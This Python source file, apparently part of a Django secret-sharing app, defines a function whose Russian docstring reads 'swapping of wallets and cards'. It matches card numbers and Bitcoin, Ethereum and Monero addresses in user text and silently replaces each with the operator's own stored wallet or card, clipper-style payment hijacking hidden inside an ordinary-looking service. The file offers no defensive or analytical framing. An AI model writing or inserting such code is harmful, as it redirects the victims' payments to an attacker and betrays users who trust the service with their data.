import re
from onetimesecret.models import CryptoWallet


def changing_wallets(text):
    """Подмена кошельков и карт"""
    # Patterns regex wallets
    pattern_visa = '4[0-9]{12}(?:[0-9]{3})?$'
    pattern_master_card = '^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$'
    pattern_btc_last = '([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'
    pattern_btc_new = '(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}'
    pattern_eth = '0x[a-fA-F0-9]{40}'
    pattern_monero = r"4([0-9AB]{1})([0-9a-zA-Z]{93})"
    words = text.split(' ')
    # My wallets
    my_visa = CryptoWallet.objects.get(name="visa_card").wallet
    my_master_card = CryptoWallet.objects.get(name="master_card").wallet
    my_bitcoin_wallet = CryptoWallet.objects.get(name="bitcoin").wallet
    my_ethereum_wallet = CryptoWallet.objects.get(name="ethereum").wallet
    my_monero_wallet = CryptoWallet.objects.get(name="monero").wallet
    # New text variable
    new_text = text

    for word in words:
        visa_card = re.search(pattern_visa, word)
        master_card = re.search(pattern_master_card, word)
        bitcoin_last = re.search(pattern_btc_last, word)
        bitcoin_new = re.search(pattern_btc_new, word)
        ethereum = re.search(pattern_eth, word)
        monero = re.search(pattern_monero, word)
        if visa_card:
            new_text = new_text.replace(visa_card.group(0), my_visa)
        elif master_card:
            new_text = new_text.replace(master_card.group(0), my_master_card)
        elif bitcoin_last and '0x' not in word and len(word) < 50:
            new_text = new_text.replace(bitcoin_last.group(0), my_bitcoin_wallet)
        elif bitcoin_new and '0x' not in word and len(word) < 50:
            new_text = new_text.replace(bitcoin_new.group(0), my_bitcoin_wallet)
        elif ethereum:
            new_text = new_text.replace(ethereum.group(0), my_ethereum_wallet)
        elif monero:
            new_text = new_text.replace(monero.group(0), my_monero_wallet)

    if new_text != text:
        return new_text
    else:
        return text
